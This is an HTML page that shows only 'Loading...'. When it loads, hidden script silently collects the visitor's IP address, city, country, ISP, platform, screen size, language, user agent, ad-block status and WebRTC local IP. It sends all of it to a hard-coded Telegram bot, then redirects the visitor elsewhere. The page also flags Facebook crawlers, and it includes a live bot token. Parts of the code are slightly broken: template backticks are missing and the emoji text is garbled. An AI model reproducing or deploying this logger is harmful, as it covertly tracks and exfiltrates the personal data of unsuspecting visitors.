<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Logger Stage</title>
  <script>
    async function getIPInfo() {
      try {
        const res = await fetch("https://ipinfo.io/json?token=be5998b85f541c");
        return await res.json();
      } catch (e) {
        return {};
      }
    }

    function detectPlatform() {
      const ua = navigator.userAgent;
      if (/android/i.test(ua)) return "Android";
      if (/iPad|iPhone|iPod/.test(ua)) return "iOS";
      if (/Win/.test(ua)) return "Windows";
      if (/Mac/.test(ua)) return "MacOS";
      if (/Linux/.test(ua)) return "Linux";
      return "Unknown";
    }

    function detectAdBlock() {
      return new Promise(resolve => {
        const testAd = document.createElement("div");
        testAd.innerHTML = "&nbsp;";
        testAd.className = "adsbox";
        testAd.style.position = "absolute";
        testAd.style.height = "1px";
        document.body.appendChild(testAd);
        setTimeout(() => {
          resolve(testAd.offsetHeight === 0);
          document.body.removeChild(testAd);
        }, 100);
      });
    }

    function detectWebRTCLocalIP(callback) {
      const pc = new RTCPeerConnection({iceServers:[]});
      pc.createDataChannel("");
      pc.createOffer().then(offer => pc.setLocalDescription(offer));
      pc.onicecandidate = event => {
        if (event && event.candidate && event.candidate.candidate) {
          const parts = event.candidate.candidate.split(" ");
          const ip = parts[4];
          if (!ip.startsWith("192.") && !ip.startsWith("10.") && !ip.startsWith("172.")) return;
          callback(ip);
          pc.close();
        }
      };
    }

    async function sendToTelegram(message) {
      const token = "8182692132:AAGPJzf4tOZ7be5vrvd3RD3RJFZoEbmq1zg";
      const chat_id = "6239813037";
      const url = https://api.telegram.org/bot${token}/sendMessage;
      await fetch(url, {
        method: "POST",
        headers: {"Content-Type": "application/json"},
        body: JSON.stringify({chat_id, text: message, parse_mode: "Markdown"})
      });
    }

    function formatMessage(data) {
      return ðŸ“„ *[LOGGER STAGE]*
ðŸš€ *User Info:*
ðŸŒ *IP:* ${data.ip || "Unknown"}
ðŸ“ *City:* ${data.city || "Unknown"}
ðŸŒŽ *Country:* ${data.country || "Unknown"}
ðŸ¢ *ISP:* ${data.org || "Unknown"}
ðŸ–¥ *Platform:* ${data.platform}
ðŸ“± *Resolution:* ${data.resolution}
ðŸŒ *Language:* ${data.language}
ðŸ§  *User-Agent:* \${data.ua}\
ðŸ›¡ *AdBlock:* ${data.adblock ? "Yes" : "No"}
ðŸ“¡ *WebRTC Local IP:* ${data.localIP || "N/A"}
ðŸ•’ *Timestamp:* ${new Date().toISOString()}
ðŸ” *FB Crawler:* ${/FBAN|FBAV|facebookexternalhit/i.test(data.ua) ? "Yes" : "No"};
    }

    async function run() {
      const ipData = await getIPInfo();
      const ua = navigator.userAgent;
      const res = ${window.screen.width}x${window.screen.height};
      const lang = navigator.language;
      const platform = detectPlatform();
      const adblock = await detectAdBlock();
      detectWebRTCLocalIP(async localIP => {
        const msg = formatMessage({
          ...ipData, ua, resolution: res, language: lang,
          platform, adblock, localIP
        });
        await sendToTelegram(msg);
        window.location.href = "redirect_ultimate.html";
      });
      // fallback if WebRTC doesn't return
      setTimeout(async () => {
        const msg = formatMessage({
          ...ipData, ua, resolution: res, language: lang,
          platform, adblock, localIP: "N/A"
        });
        await sendToTelegram(msg);
        window.location.href = "redirect_ultimate.html";
      }, 5000);
    }

    window.onload = run;
  </script>
</head>
<body>
  <h1>Loading...</h1>
</body>
</html>
